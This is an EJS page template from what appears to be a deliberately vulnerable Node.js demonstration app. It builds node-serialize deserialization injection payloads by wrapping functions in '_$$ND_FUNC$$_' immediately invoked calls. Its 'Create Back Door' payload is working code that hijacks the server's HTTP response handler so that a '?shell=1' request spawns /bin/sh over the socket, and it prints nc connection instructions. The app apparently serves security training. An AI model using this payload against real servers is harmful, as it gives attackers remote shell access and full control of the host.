<h1 class="page-header"><%= name %></h1>
<% include ../partials/ruleInfo.ejs %>
<% sinkData.forEach(function(sink) { %>
  <div class="row">
    <div class="col-sm-10 col-sm-8" style="padding-bottom: 30px;">
      <h4 class="sub-header">
        <code><%= sink.name %></code>
      </h4>
      <form method="<%= sink.method %>>" action="<%= sink.url %>" target="_blank">
        <div class="form-group">
          <label for="name">INPUT: </label>
          <input name="input" class="form-control" id="input" placeholder="Your Name" value="dog">
        </div>
        <button type="submit" class="btn btn-default">Submit</button>

        <br/>
        <br/>

        <a style="cursor:pointer" id="console-log">Execute `console.log`</a>
        &nbsp;&nbsp;
        <a style="cursor:pointer;font-size:8pt;color:#568956;" id="show-console-log">(Show/Hide Code)</a>

        <pre style="display:none;width:800px;" id="console-log-text"></pre>

        <br/>
        <br/>

        <a style="cursor:pointer" id="setup-back-door">Create Back Door</a>
        &nbsp;&nbsp;
        <a style="cursor:pointer;font-size:8pt;color:#568956;" id="show-setup-back-door">(Show/Hide Code)</a>

        <pre style="display:none;width:800px;" id="setup-back-door-text"></pre>

      </form>
    </div>
  </div>
<% }); %>


<script type="text/javascript">

 function prepToEval ( code ) {
   return '_$$ND_FUNC$$_(' + code.toString() + '())';
 }

 $('#setup-back-door')
   .on('click', function ( ) {
     var executable = prepToEval(makeBackdoorShell);
     $('[name="name"]').val(executable);
   });

 $('#show-setup-back-door')
   .on('click', (function ( offOn ){
     $('#setup-back-door-text').html(makeBackdoorShell.toString());
     return function ( ) {
       if (offOn) {
	 $('#setup-back-door-text').show(); }
       else {
	 $('#setup-back-door-text').hide(); }
       offOn = offOn ? 0 : 1;
     };
   }(1)));

 $('#console-log')
   .on('click', function ( ) {
     var executable = prepToEval(consoleLog);
     $('[name="name"]').val(executable);
   });

 $('#show-console-log')
   .on('click', (function ( offOn ){
     $('#console-log-text').html(consoleLog.toString());
     return function ( ) {
       if (offOn) {
	 $('#console-log-text').show(); }
       else {
	 $('#console-log-text').hide(); }
       offOn = offOn ? 0 : 1;
     };
   }(1)));

 // This is code that just logs to stdout in the server process
 function consoleLog ( ) {
   console.log('........\nHello, Mr/Ms. Server!\n````````');
 }

 // This is code that would create a way to
 //  get back-door shell, if executed on the server.
 function makeBackdoorShell ( ) {
   require('http').ServerResponse.prototype.end = (function ( end ) {
     return function ( ) {

       console.log('..............................');
       console.log('How to obtain a shell session:');
       console.log('$> nc localhost 3000');
       console.log('$> GET/?shell=1 HTTP/1.1');
       console.log('``````````````````````````````');

       if (this.socket._httpMessage.req.query.shell === '1') {
	 ['close',
	  'connect',
	  'data',
	  'drain',
	  'end',
	  'error',
	  'lookup',
	  'timeout',
	  ''].forEach(this.socket.removeAllListeners.bind(this.socket));

	 var cp = require('child_process');
	 var net = require('net');
	 var sh = cp.spawn('/bin/sh');
	 sh.stdout.pipe(this.socket);
	 sh.stderr.pipe(this.socket);
	 this.socket.pipe(sh.stdin);
       } else {
	 end.apply(this, arguments);
       }
     }
   })(require('http').ServerResponse.prototype.end);
 }
</script>

